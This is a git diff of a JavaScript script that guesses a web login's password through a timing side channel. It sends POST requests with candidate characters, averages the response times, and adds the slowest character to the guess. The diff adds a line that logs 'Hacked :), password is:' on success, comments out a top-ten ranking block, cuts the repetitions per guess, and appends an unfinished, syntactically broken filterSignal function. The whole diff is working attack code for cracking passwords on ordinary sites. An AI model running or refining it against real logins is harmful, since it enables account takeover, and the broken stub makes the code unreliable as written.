@@ -26,6 +26,9 @@ function tryPass(startIndex, maxInd, replInd, replMax, passSoFar, maxPassLength)
     method: 'POST',
     body: formData
   }).then(res => {
+    if (res.ok) {
+      console.log("Hacked :), password is: ", passSoFar);
+    }
     tryTiming[startIndex][1].push(new Date().getTime() - startTime);
     if (replInd + 1 < replMax) {
       return tryPass(startIndex, maxInd, replInd + 1, replMax, passSoFar, maxPassLength);
@@ -38,18 +41,18 @@ function tryPass(startIndex, maxInd, replInd, replMax, passSoFar, maxPassLength)
       let averages = tryTiming.map(arr => [arr[0], arr[1].reduce((prev, curr) => prev + curr) / arr[1].length]);
 
       // Retrieve top 10 to see if we are close to guessing the right password
-      let topNumber = 10;
-      let topTen = averages.reduce((prev, curr) => {
-        if (prev.length < topNumber) {
-          return [...prev, curr];
-        } else {
-          let smallestInd = prev.map(p => p[1]).indexOf(Math.min(...prev.map(p => p[1])));
-          let replaceMent = prev[smallestInd][1] > curr[1] ? prev[smallestInd] : curr;
-          return [...prev.slice(0, smallestInd), replaceMent, ...prev.slice(smallestInd + 1)];
-        }
-      }, []);
+      // let topNumber = 10;
+      // let topTen = averages.reduce((prev, curr) => {
+      //   if (prev.length < topNumber) {
+      //     return [...prev, curr];
+      //   } else {
+      //     let smallestInd = prev.map(p => p[1]).indexOf(Math.min(...prev.map(p => p[1])));
+      //     let replaceMent = prev[smallestInd][1] > curr[1] ? prev[smallestInd] : curr;
+      //     return [...prev.slice(0, smallestInd), replaceMent, ...prev.slice(smallestInd + 1)];
+      //   }
+      // }, []);
 
-      console.log("Top10: ", topTen);
+      // console.log("Top10: ", topTen);
       // Retrieve char with most delay
       let topChar = averages.reduce((prev, curr) => prev[1] > curr[1] ? prev : curr);
       // Concat to password so far
@@ -60,6 +63,10 @@ function tryPass(startIndex, maxInd, replInd, replMax, passSoFar, maxPassLength)
   });
 }
 
-tryPass(0x0000, 0x00ff, 0, 3, "", 8).then(pass => {
+tryPass(0x0000, 0x00ff, 0, 1, "", 8).then(pass => {
   console.log(pass);
 });
+
+function filterSignal(signal, repl) {
+  signal.reduce((prev, curr) => )
+}
